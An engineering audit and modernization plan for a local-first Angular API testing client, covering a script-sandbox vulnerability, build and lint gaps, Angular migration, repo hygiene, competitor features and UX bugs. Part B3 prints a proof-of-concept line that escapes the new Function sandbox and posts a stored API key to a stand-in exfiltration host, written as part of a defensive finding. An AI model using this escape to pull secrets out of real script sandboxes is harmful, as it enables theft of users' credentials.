# Plan: Specimen Modernization — Security, Angular 22, OSS Repo, Product & UX

> **Audience:** engineering manager / tech lead making sequencing and staffing calls.
> **Status:** proposal, grounded in a full-repo audit + live UI/UX pass + external research, July 2026.
> **Retire this file** once Phases 0–3 ship; move the Phase 4 backlog into the issue tracker at that point.

---

## Executive Summary

API Sandbox is a local-first, no-account API testing client (Angular 20.3, PrimeNG 20, IndexedDB, client-side AES-GCM secrets vault) that already has real functional depth: a Postman-grade response viewer, environment variable resolution with live chips, a history drawer, and a newly-shipped scripting/assertions feature. The product instinct is sound and the "no cloud, no telemetry, no account" positioning is exactly what the market currently rewards — it's the same value proposition driving developers toward Bruno and away from Postman/Insomnia (see Part C).

But the repo has not kept pace with the product. Four things are true simultaneously:

1. **There is a critical, shippable security vulnerability** in the new pre/post-script feature — arbitrary script execution with full page privileges, reachable via an imported collection file, with zero test coverage.
2. **There is no safety net.** No CI, no working linter (`ng lint` points at a builder that no longer exists), no license file despite the README claiming MIT, and `npm run build` — the command the README itself tells a new contributor to run — fails outright because `package.json` has no `scripts` block.
3. **The Angular code is a partial migration**, not a legacy app and not a modern one: 100% standalone components and 99% modern control-flow syntax sit next to 0% `OnPush`, 0% signal-based `input()`/`output()`, and a hard dependency on zone.js.
4. **The UI has real, user-facing bugs**, not just polish gaps: an invalid URL silently fetches the app's own HTML and displays it as a fake "200 OK," a keyboard focus trap makes the Send button unreachable without a mouse, and the entire request composer breaks on mobile viewports.

None of this is a reason to be discouraged — it's a normal state for a fast-moving solo/small-team project that has been shipping features faster than it's been shipping guardrails. The plan below sequences the fix: stabilize first, modernize the engineering substrate second, catch up on product/UX third, and differentiate fourth. Parts A–D are the evidence; Part E is the plan.

**Top 5 items that should not wait for a phase to start:**

| # | Item | Why it can't wait |
|---|---|---|
| 1 | Script sandbox escape (Part B3) | Arbitrary JS execution, reachable from importable collection JSON, can exfiltrate decrypted secrets |
| 2 | No CI / no working lint / broken `npm run build` | This is very plausibly *how* #1 shipped untested |
| 3 | Invalid URL silently returns a fake 200 with the app's own HTML | Actively misleading; a user could ship a false "the API works" conclusion |
| 4 | Keyboard focus trap in the Collections panel | Total accessibility blocker — a keyboard user cannot send a request |
| 5 | No LICENSE file despite README claiming MIT | Legal ambiguity for anyone using or forking a "public" repo with a live demo URL |

---

## Part A — What This App Actually Is (grounding for the rest of the doc)

Angular 20.3.4, PrimeNG 20, Tailwind 3 (`tailwind.config.js`, not CSS-first Tailwind 4), Monaco editor 0.54 lazy-loaded, `idb` 8 for IndexedDB persistence, Web Crypto (PBKDF2 + AES-GCM) for a client-side secrets vault. No backend — every feature (collections, environments, history, secrets) lives entirely in the browser. Core surfaces: request composer (Params/Headers/Auth/Scripts tabs), response viewer (Body/Headers/Timings/Tests tabs), collections tree, environment manager, secrets vault, history drawer, command palette (⌘K), dark/light theme.

---

## Part B — Critical Evaluation

### B1. The Good — keep doing this

- **No XSS surface.** Zero `innerHTML`, `bypassSecurityTrust*`, or `DomSanitizer` usage anywhere in `src/app` — response bodies render exclusively through the Monaco-backed JSON editor, not raw HTML binding. Structural, not incidental.
- **Secrets vault cryptography is sound.** AES-GCM-256 with a fresh random salt/IV per encryption, PBKDF2-SHA256 at 200k iterations, ciphertext-only IndexedDB storage, key held in memory only and cleared on `beforeunload` (`secret-crypto.service.ts`). The design matches its own documentation (`docs/secrets.md`) exactly — a real asset.
- **`IdbService` has a graceful in-memory fallback** when IndexedDB is unavailable, and wraps transactions with commit-or-rollback semantics — resilience most side-project data layers skip.
- **Monaco is lazy-loaded correctly** via `@defer (on viewport)` and dynamic `import()` (`script-editor.component.ts`, `shared/monaco/monaco-loader.ts`) — genuinely modern, deliberate performance work.
- **Documentation quality where it exists is high.** `docs/secrets.md`, `docs/storage.md`, `docs/collections-schema.md` were spot-checked line-by-line against source and match exactly. `docs/plans/plan-product-roadmap.md` is a genuinely sharp 370-line competitive/strategic document.
- **The Response Viewer, environment-variable resolution UX, history drawer, and theme parity are genuinely competitive.** The `{{var}}` autocomplete chip showing source + resolved value while typing a URL is a level of polish most side projects never reach. Dark/light themes are both intentionally designed, not one inverted from the other.
- **Test quality, where tests exist, is real.** `secret-crypto.service.spec.ts` asserts real round-trip encryption and rejection of wrong passphrases via `expectAsync().toBeRejected()` — not `should create` stubs. Only 3 of 12 spec files contain a trivial stub, and in each case it's supplementary.
- **Standalone components and modern control flow are essentially done.** 10/10 components are standalone; 96/97 template control-flow sites use `@if`/`@for`/`@switch`.

### B2. The Bad — architecture, tooling, and process debt

| Finding | Evidence | Severity |
|---|---|---|
| `IdbService` is a 1,366-line god object owning 7 unrelated concerns (history, collections, folders, requests, environments, secrets, meta) | `src/app/data/idb.service.ts` | Medium-High |
| `ApiParamsComponent` is a 1,107-line god component: request builder + HTTP orchestrator + script runner + assertion runner + variable UI + cURL export, all in one class with no extractable pipeline service | `src/app/components/api-params/api-params.component.ts:26-58` | Medium |
| `CollectionsService.refresh()` re-reads the entire tree from IndexedDB (N+1 pattern: 1 + 2×collections queries) on every single create/rename/delete/reorder, with no optimistic local patch | `collections.service.ts:32-48` | Medium |
| Zero `ChangeDetectionStrategy.OnPush` across all 10 components, zone.js still a hard dependency, `ngDoCheck()` runs non-trivial logic on every CD cycle for the app's lifetime | `polyfills.ts:1`, `api-params.component.ts:247-249` | Medium |
| Signal-based `input()`/`output()`/`viewChild()` adoption: 0%. Every component still uses `@Input()`/`@Output()`/`@ViewChild()` decorators | 9/10 components, e.g. `response-viewer.component.ts:75-115` | Low-Medium |
| `package.json` has no `name`, `version`, or `scripts` — `npm run build`, the exact command the README tells contributors to run, fails immediately | `package.json` (full file) | **High** |
| `tslint.json` + `angular.json`'s lint target still points at `@angular-devkit/build-angular:tslint`, a builder removed from Angular tooling years ago — `ng lint` almost certainly does not run | `angular.json`, `tslint.json` | Medium |
| `tsconfig.json` has no `"strict": true` (default in Angular CLI since v12) | `tsconfig.json` | Medium |
| Default (non-production) build config sets `"aot": false` explicitly — `ng serve`/plain `ng build` produce a non-representative JIT build, and there's no documented canonical build command anywhere in-repo | `angular.json` | Medium-High |
| No CI of any kind — nothing runs lint/test/build on push or PR | confirmed absent `.github/workflows/` | **High** |
| No LICENSE file despite README claiming "MIT © Ashwin Sathian"; no CONTRIBUTING.md, CODE_OF_CONDUCT.md, SECURITY.md, issue/PR templates, CODEOWNERS, Dependabot/Renovate config, CHANGELOG, or README badges | repo root scan | Medium-High |
| `e2e/` still runs Protractor (deprecated since 2023, removed from Angular CLI) against DOM structure from the original scaffold — the suite has clearly never been updated and would fail if run | `e2e/src/app.e2e-spec.ts:11-13` | Medium |
| Zero automated test coverage for the two newest, most security-sensitive files in the app: `script-sandbox.service.ts` and `assertion-runner.service.ts` (see B3) | confirmed absent from `find src -name "*.spec.ts"` | **High** |
| Zero ARIA attributes, `role`s, or `tabindex` anywhere in any template | exhaustive grep, all templates | **High** |
| README claims a **removed** feature (NDJSON export) still exists, in three separate places, and its feature list is stale in both directions relative to the actual shipped feature set | `README.md:15,41,55` vs. `grep -rn "ndjson" src/app` → zero matches | Medium |

### B3. The Ugly — the script sandbox is not a sandbox

The newest feature in the app (`shared/scripts/script-sandbox.service.ts`, from the "Phase 3A" commit) runs pre/post-request scripts via:

```ts
new Function("pm", "console", wrappedCode)
```

where `wrappedCode` shadows `window`, `document`, `fetch`, `XMLHttpRequest`, `eval`, and about 20 other globals by declaring them as `undefined` function parameters. The code's own comment acknowledges the gap and misjudges it: *"The Function constructor itself can't be blocked this way... but we prevent network access and DOM manipulation."*

That's incorrect. `Function` is a language primitive reachable via the normal scope chain regardless of what's shadowed, so any script can trivially re-acquire everything the shadowing tried to block:

```js
Function('return fetch')()('https://evil.example/exfil', {
  method: 'POST',
  body: JSON.stringify({ leaked: pm.environment.get('API_KEY') })
});
```

This runs on the main thread — not a Worker, not an iframe — with full access to `document`, cookies, `localStorage`, and every page global once re-acquired. Because scripts are stored as plain strings on `RequestDoc` and collections are importable JSON (`IdbService.importCollectionExport`), **importing a shared collection and running one of its requests executes attacker-controlled JS with full page privileges**, including reading decrypted secrets via `pm.environment.get()`. There is no test asserting the sandbox actually holds — which, notably, is exactly the kind of test that would have caught this before it shipped. There is also no CSP in `index.html` that would have provided a second line of defense.

**This is the one item in this entire document that should be treated as a production incident, not a backlog item**, regardless of how the rest of this plan gets sequenced.

---

## Part C — Competitive Positioning

### Where API Sandbox already sits correctly

The local-first, no-account, no-telemetry model is not a compromise — it's the exact value proposition driving real, documented user migration away from incumbents:

- Postman removed offline "Scratch Pad" mode in 2023 (forced cloud login to open collections) and, as of March 2026, made its free tier single-user only — pushing teams toward alternatives.
- Insomnia (post-Kong acquisition) shipped a forced-account update in 2023 with no warning, locking users out of their own local data — a GitHub issue titled literally "enshittification" and an HN thread both called it out directly, and trust damage lingered even after partial remediation.
- Bruno's plain-text, git-native `.bru` file storage is the single most-repeated reason people cite for switching from Postman — testimonials describe it as "removing weight from my shoulders." Community sentiment is explicit that no-account/no-cloud/no-telemetry is a *feature*, not an absence of one.

API Sandbox already has the philosophy right. What it doesn't have is the structural follow-through: IndexedDB is the opposite of Bruno's git-friendly plain-text model, which is the biggest gap versus its closest philosophical peer.

### Feature gaps, ranked by demand signal × feasibility

| Priority | Gap | Why it matters |
|---|---|---|
| P0 | Plain-text, git-friendly collection export/sync (JSON/YAML to a folder) | The single most-cited love-driver for the closest peer (Bruno); also the gateway to "AI-coding-assistant-friendly" positioning, the newest fast-growing differentiator in this space |
| P0 | Request chaining / variable capture from a previous response | The #1 real-world workflow need (auth-token chaining); the new scripting feature may partially cover this already — needs to be explicit and discoverable, not just theoretically possible |
| P0 | CLI test runner with JUnit XML output | Hard blocker for any team adopting this beyond solo/manual use — no CI-runnable collections means no real CI/CD adoption |
| P1 | OpenAPI/Swagger import (and ideally Postman-collection import) | Baseline expectation now, not a differentiator; its absence is a switching-cost tax keeping people on incumbents |
| P1 | Full OAuth2 grant-type support with token refresh | Common gap complaint for lighter clients; a recurring reason teams keep Postman around "just for OAuth" |
| P1 | Multi-language code snippet generation (extend existing cURL export) | Low effort relative to value; standard in every competitor |
| P1 | GraphQL support (introspection, query builder) | Hoppscotch's signature strength, increasingly expected of any "modern" client |
| P2 | Command palette buildout, WebSocket/SSE support, response/environment diffing | Emerging/differentiating, not yet universal |
| P2 | Mock server capability | Still a gap even for Bruno — a real opportunity to differentiate rather than catch up |
| P3 | gRPC, plugin/extension architecture | Longer-horizon; relevant if the audience skews toward microservice/backend teams |

**Explicit anti-goal:** if any collaboration/sync feature is ever added, follow the lesson from Insomnia's backlash, not the mistake — sharing must be opt-in per collection, never a mandatory account gate that blocks access to data that was previously local-only.

---

## Part D — UI/UX Evaluation (live walkthrough, desktop + mobile + keyboard)

### What already reads as professional

The Response Viewer (status pill, Body/Headers/Timings/Tests tabs, working search), the environment-variable autocomplete chip, the Tests/assertion builder (a friendlier alternative to raw `pm.test()` scripting), the history drawer's date-grouped relative timestamps, and consistent focus-ring styling on every interactive element are all genuinely on par with Postman/Insomnia. The empty states (dashed border, centered icon, one-line copy) are consistent across every panel — a level of design discipline most side projects skip.

### Bugs, not polish — fix in Phase 0

| # | Bug | Impact |
|---|---|---|
| 1 | An unparseable URL (e.g. `"not a valid url at all"`) is never validated — it resolves as a relative path against the app's own origin, fetches the app's **own `index.html`**, and displays it as a "200 OK" response | Actively misleading; no error is ever shown |
| 2 | Keyboard Tab order gets stuck looping 3 icons in the Collections panel header indefinitely | Keyboard-only users can never reach Send, other tabs, or the response viewer |
| 3 | At 390px width, tab labels vanish and **all four** composer tab panels render simultaneously, stacked, unlabeled; Monaco gets stuck on "Loading editor..." | The core workflow is unusable on a phone |
| 4 | Monaco throws `TypeError: Ol.json is not a constructor` on every load; Headers "JSON mode" renders a blank editor | Likely degrades JSON validation/autocomplete app-wide, not just the visible symptom |
| 5 | Network-error responses show the raw `{"isTrusted": true}` event property instead of a readable message | Leaky, unhelpful error surface |
| 6 | Timings tab shows 5148ms for the same response the status bar reports as 1176ms | Undermines trust in every other number the tool reports |
| 7 | Method-dropdown menu is translucent; underlying tab text bleeds through | Legibility bug on the highest-traffic control in the app |

### Discoverability and structural gaps — fix in Phase 3

- [x] ~~No visible "Save request to Collection" action was found anywhere in the composer's toolbar/tooltips — if it exists, it isn't surfaced.~~ **Fixed** — it didn't just need surfacing, the capability didn't exist at all: a request created via the sidebar's "New Request" prompt could never be edited again (no `updateRequest` anywhere in `CollectionsService`/`CollectionsRepository`/`IdbService`). Added `updateRequest()` at all three layers plus a composer **Save**/**Save to Collection** action (icon button next to Send) that persists the full state — method/URL/headers/body/auth/scripts/tests — and a Save-As dialog for unbound requests.
- [x] ~~Collection folders render as plain text with no icon or expand chevron — indistinguishable from a label.~~ **Fixed** — collection/folder icons added to the tree template (the expand/collapse chevron was already there via PrimeNG's own tree toggler; only the icon was actually missing).
- [ ] No dedicated secrets-management view; secrets appear to be managed only as flagged rows inside the Environments editor, which under-signposts the "vault" concept the first-use flow sets up.
- [ ] No Settings surface anywhere (theme toggle exists, but no reset-all-data, keyboard shortcuts reference, or preferences screen) — partially addressed: Reset All Data and Local Bridge settings are now both reachable from the command palette, but there's still no dedicated Settings screen.
- [x] ~~Command palette (⌘K) currently has exactly one registered command ("New Collection") — the UI for it is done, the content isn't.~~ **Fixed** — registered New Request, Send Request, Focus Address Bar, theme toggle, open History, lock/unlock secrets, Local Bridge settings, and Reset All Data, sourced from `AppShellComponent` (the sidebar palette had no access to those) via a new `[externalActions]` input on `CollectionsSidebarComponent`.
- [ ] Fixed-width centered layout leaves large amounts of dead canvas at 1024px–1440px+ where every competitor uses a resizable multi-pane split.
- [ ] Disabled "Copy as cURL" button renders as an empty box, easily mistaken for broken rather than disabled.

**Also found and fixed this pass, not in the original audit:**

- **A successful Send unconditionally cleared the entire composer** (`sendRequest()` called `resetForm()` on every send, wiping method/url/headers/body/auth the instant a response arrived) — arguably a worse bug than anything in the Phase 0 table above, since it broke the basic compose→send→tweak→resend loop for every request, every time. Fixed: Send no longer resets the form; an explicit "New Request" action (previously only a non-functional mobile-only button) is the one thing that does.
- Loading a saved collection request into the composer silently dropped auth/scripts/tests (the tree only ever emitted a lossy history-shaped object). Fixed alongside the Save work above.
- The Send button's intended gradient styling was a silent no-op (`styleClass` isn't a real input on PrimeNG's `pButton` *directive*, only on the `<p-button>` *component*), leaving it on the theme's default primary color — which turned out to fail WCAG AA contrast (1.99:1 against white text, needs 4.5:1). This was masked in the existing accessibility e2e test by the send-then-clear bug above (the cleared/disabled button was exempt from the contrast check). Both are now fixed.

---

## Part E — The Plan

Four phases. **Phase 0 is a hard prerequisite** for the others — nothing else should be considered "landed" while the sandbox vulnerability and the broken build/lint/test loop are open, because they undermine confidence in everything shipped afterward. Phases 1 and 2 can run in parallel once Phase 0 is closed. Phase 3 depends on Phase 1's `OnPush`/signal groundwork for the layout work to not be fought by change-detection quirks. Phase 4 is a standing backlog, not a sprint.

### Phase 0 — Stabilize (target: 1–2 weeks, blocks everything else)

**Goal:** close the security hole, restore a working build/lint/test loop, fix the bugs that actively mislead users.

| Task | Detail | Acceptance criteria |
|---|---|---|
| Replace the script sandbox execution model | Move off `new Function` in the main thread entirely. Use a Web Worker with **no closure over any page global** (scripts communicate with the host only via `postMessage`/structured clone — `pm.environment`/`pm.test` become RPC calls, not closures), or a same-origin-stripped `<iframe sandbox="allow-scripts">` with no `allow-same-origin`. Either eliminates the `Function`-escape path structurally rather than by block-listing. | New regression test suite proves `fetch`, `document`, `window`, `Function`-based re-acquisition of globals, and `pm.environment` leakage are all unreachable from script content. Ship `docs/scripts.md` documenting the real, verified guarantee. |
| Add a Content-Security-Policy | `script-src 'self'` (no `unsafe-eval`), `object-src 'none'`, appropriate `connect-src` for arbitrary user-specified API hosts | CSP present in `index.html` or edge headers; verified it doesn't break Monaco's worker loading |
| Fix `package.json` | Add `name`, `version`, `scripts` (`start`, `build`, `test`, `lint`), `engines.node` | `git clone` → `npm ci` → `npm run build` succeeds with no prior tribal knowledge |
| Replace TSLint with ESLint | `@angular-eslint/*` + `ng lint` wired to `@angular-eslint/builder` | `ng lint` runs and reports real violations |
| Enable `"strict": true` in `tsconfig.json` | Fix resulting compile errors incrementally, file by file if needed | Strict mode on, build green |
| Reconcile the `"aot": false` default build config | Either make the default match production intent, or explicitly document why they differ and what command CI/deploy actually uses | One documented, canonical build command exists in-repo |
| Fix the 7 UX bugs in Part D's first table | URL validation before send, fix keyboard focus trap, fix mobile composer collapse, fix Monaco JSON worker crash, fix leaky network-error message, reconcile Timings numbers, fix dropdown opacity | Each verified manually + covered by a regression test where feasible |

### Phase 1 — Angular Specimen Modernization (target: 2–3 sprints, parallel with Phase 2)

**Goal:** the codebase itself becomes the reference example — Angular's own current style guide, verified against angular.dev, applied end to end.

| Task | Detail |
|---|---|
| Run official migration schematics | `signal-input-migration`, `signal-queries-migration`, output-function migration, and the control-flow migration for the one remaining `*ngIf` (`environments-manager.component.html:73`) |
| Convert all constructor DI to `inject()` | Currently mixed across 13 files; make it uniform |
| Add `ChangeDetectionStrategy.OnPush` to all 10 components | Pairs with the signal-input migration above — do them together |
| Remove the `ngDoCheck()` anti-pattern in `ApiParamsComponent` | Replace with a `computed()` signal or `effect()` driven by actual input changes |
| Adopt file-naming per the current style guide | Drop `.component`/`.service` type suffixes where the guide now recommends it; apply consistently |
| Delete the dead `AppRoutingModule` | Confirmed unused (`Routes = []`, never imported) — either wire up real routing if the roadmap calls for it, or remove |
| Split `IdbService` into per-aggregate repositories | `HistoryRepository`, `CollectionsRepository`, `EnvironmentsRepository`, `SecretsRepository` behind a thin facade — each independently testable |
| Extract request-execution orchestration out of `ApiParamsComponent` | New `RequestExecutionService` owns pre-script → send → post-script → assertions sequencing, unit-testable without the Angular component harness |
| Fix `CollectionsService.refresh()`'s N+1 pattern | Patch in-memory state on mutation instead of re-reading the entire tree from IndexedDB on every create/rename/delete/reorder |
| Migrate test runner from Karma/Jasmine to Vitest | Via `@angular/build:unit-test`; port existing 12 spec files |
| Replace Protractor e2e with Playwright | Via `playwright-ng-schematics`; delete the vestigial `e2e/` Protractor scaffold; build a real, small e2e suite covering: send request → view response, save request into a collection, create environment + resolve variable, unlock secrets vault |
| Add missing spec coverage | Priority order: `script-sandbox.service.ts`/`assertion-runner.service.ts` (security-critical, currently zero coverage), then `collections.service.ts`, `environments.service.ts`, `secrets.service.ts`, `collections-sidebar.component.ts`, `environments-manager.component.ts` |
| Evaluate zoneless (`provideZonelessChangeDetection()`) | Stage as its own follow-on task once `OnPush` + signal inputs are in place everywhere; measure before/after |

**Acceptance criteria:** every item in the "Angular Specimen Checklist" (Part G) is checked; Vitest + Playwright run in CI; no file exceeds ~400 lines without an explicit justification comment; coverage threshold enforced in CI with meaningful (not vanity) assertions on security-critical paths.

### Phase 2 — OSS Specimen Repo (target: 1 sprint, parallel with Phase 1)

**Goal:** a stranger can clone this, understand it, trust it, and contribute to it without asking a single question in a DM.

| Task | Detail |
|---|---|
| Add `LICENSE` | Confirm license choice with the repo owner (README currently claims MIT — verify that's still the intent before adding it) |
| Add `CONTRIBUTING.md` | Setup, branch/PR flow, how to run tests/lint locally, code style expectations |
| Add `CODE_OF_CONDUCT.md` | e.g. Contributor Covenant |
| Add `SECURITY.md` | Responsible-disclosure process — directly motivated by the Part B3 finding |
| Add `.github/ISSUE_TEMPLATE/`, `PULL_REQUEST_TEMPLATE.md`, `CODEOWNERS` | Standard GitHub community health files |
| Add `.github/workflows/ci.yml` | Gate every PR on: lint, unit test (Vitest), build, e2e (Playwright), bundle-size budget check |
| Add Renovate or Dependabot config | Automated dependency updates + vulnerability alerts |
| Add README badges | Build status, license, coverage |
| Rewrite README | Fix the NDJSON claim (feature was removed), fix the quick-start now that `npm run build` actually works, fix the license section to match the real LICENSE file, bring the feature list current (scripts/tests/history/secrets are shipped and undocumented; several claimed things aren't there), link CONTRIBUTING |
| Reconcile `docs/plans/plan-product-roadmap.md` | It says "destroy after implementation" — Phases 3.1/3.2 (scripts, assertions) are done; retire or update it rather than leaving it stale |
| Add `docs/scripts.md` | Document the *actual, verified* sandbox model from Phase 0's fix — this doc doesn't exist today, and it's exactly the doc that would have prevented the Part B3 finding from going unnoticed |
| Add `CHANGELOG.md` | Or adopt Conventional Commits + automated changelog generation |

**Acceptance criteria:** a first-time external contributor can go from `git clone` to an open, CI-validated PR using only files in the repo — no tribal knowledge required.

### Phase 3 — UX Overhaul (target: 2–3 sprints, depends on Phase 1's OnPush/signal groundwork)

**Goal:** close the discoverability and structural gaps from Part D, and make the app feel deliberately designed at every breakpoint and input method, not just on a 1440px mouse-driven desktop.

| Task | Detail | Status |
|---|---|---|
| Resizable multi-pane layout | Composer/response split like Postman/Insomnia/Bruno; stop capping content to a fixed-width centered card | Open |
| Rebuild the mobile composer | Accordion or segmented-control pattern at narrow widths instead of collapsing all four tabs into one unlabeled stacked column; fix Monaco initializing inside zero-width containers | Open |
| Surface "Save to Collection" explicitly | Turned out to require building the capability itself, not just surfacing it — see Part D | **Done** |
| Give folders real affordances | Icon + expand chevron, not plain text | **Done** |
| Build a dedicated Secrets management view | Beyond the per-variable lock icon buried in the Environments editor | Open |
| Build a Settings surface | Theme, data export/import, reset-all-data, keyboard shortcuts reference | Partial — Reset All Data and Local Bridge settings are now in the command palette; no dedicated screen yet |
| Fix the small polish bugs from Part D | Disabled-button visibility, intermittent render glitch on tab/viewport transitions | Open |
| Complete the command palette | Register the toolbar actions that already exist as functions (theme toggle, history, sidebar toggle, new environment, send) — mostly a registration exercise, not new UI | **Done** |
| Accessibility pass | ARIA roles/labels across all interactive components; focus trap + restore for every dialog/drawer; add `axe-core` (or Pa11y) as a CI gate targeting 0 critical/serious violations on primary flows | Mostly done (prior session) — this pass added coverage for the Save-to-Collection dialog and command palette, and fixed a real Send-button contrast failure the existing gate had been inadvertently masking |
| Motion pass | Use the existing Obsidian design system's spring-easing tokens for tab switches, response arrival, dialog open/close — deliberate, not decorative | Open |

**Acceptance criteria:** `axe-core` CI gate green on primary flows; the send-request-and-view-response flow is completable keyboard-only and at a 390px viewport; Lighthouse accessibility score ≥ 95 on the main screen.

### Phase 4 — Product Differentiation (standing backlog, not a sprint)

Pull directly from Part C's ranked gap table. Recommended near-term sequencing: **P0 items first** (git-friendly export/sync, explicit request chaining, CLI test runner) since they're the highest leverage relative to effort and most directly address the community-demand signal found in research. Track as individual issues once Phase 0–2 give the repo a working issue-template/CI loop to track them in.

---

## Part F — Sequencing & Risk

| Phase | Est. duration | Can run in parallel with | Primary risk | Mitigation |
|---|---|---|---|---|
| 0 — Stabilize | 1–2 weeks | — (blocks all else) | Sandbox fix changes the scripting API surface for `pm.*` | Design the Worker/iframe message contract to preserve the existing `pm.environment`/`pm.test` call shape so no user-facing script-syntax break is needed |
| 1 — Angular Modernization | 2–3 sprints | Phase 2 | Large mechanical diff risk (migration schematics touching every component) | Run official Angular codemods (not hand-migration) and land in small, reviewable PRs per concern (inputs, then OnPush, then DI) rather than one giant PR |
| 2 — OSS Repo Hygiene | 1 sprint | Phase 1 | License choice is a real decision, not just a checkbox | Confirm license intent with the repo owner explicitly before adding a LICENSE file — don't default silently |
| 3 — UX Overhaul | 2–3 sprints | — (wants Phase 1's OnPush work done first) | Multi-pane layout is a real structural rewrite of the shell, higher regression risk | Land behind the new Playwright e2e suite from Phase 1 so layout changes are caught automatically |
| 4 — Product Differentiation | ongoing | all | Scope creep — this list will always be longer than capacity | Treat Part C's ranking as the actual priority order; resist re-ranking without new evidence |

---

## Part G — "Specimen" Definition of Done

### Angular Specimen Checklist
- [ ] 100% standalone components (already true — maintain it)
- [ ] 100% `@if`/`@for`/`@switch` (1 remaining `*ngIf` to migrate)
- [ ] 100% `inject()`, 0% constructor-parameter DI
- [ ] 100% signal-based `input()`/`output()`/`viewChild()`, 0% legacy decorators
- [ ] 100% `ChangeDetectionStrategy.OnPush`
- [ ] `tsconfig.json` `"strict": true`
- [ ] ESLint (`@angular-eslint`) replacing TSLint, `ng lint` functional
- [ ] Vitest replacing Karma/Jasmine
- [ ] Playwright replacing Protractor
- [ ] Zoneless change detection evaluated and either adopted or explicitly deferred with a written reason
- [ ] No file over ~400 lines without a documented justification
- [ ] CI runs lint + unit test + build + e2e on every PR

### OSS Repo Checklist
- [ ] LICENSE present and matching README's claim
- [ ] CONTRIBUTING.md, CODE_OF_CONDUCT.md, SECURITY.md present
- [ ] `.github/` issue/PR templates, CODEOWNERS, CI workflow present
- [ ] Automated dependency updates configured
- [ ] README accurate against current shipped features (verified, not assumed)
- [ ] Every doc in `docs/` reflects current code (spot-checked, like `docs/secrets.md`/`docs/storage.md` already do)
- [ ] CHANGELOG or equivalent release-history mechanism

---

## Part H — Success Metrics

- **Security:** the Part B3 vulnerability closed with a regression test; CSP present; 0 open Critical/High findings from a follow-up audit.
- **Build health:** `npm run build`/`test`/`lint` all succeed from a clean clone; CI green on every PR to `master`.
- **Code health:** coverage threshold enforced and rising on security-critical files specifically (not just aggregate %); no god-object file additions without justification.
- **Accessibility:** `axe-core` CI gate at 0 critical/serious violations on primary flows; Lighthouse accessibility ≥ 95.
- **Product:** Phase 4 P0 items (git-friendly export, request chaining, CLI runner) shipped and documented.
- **OSS health:** time from `git clone` to a CI-validated first external PR — target: no questions needed, everything answerable from files in the repo.
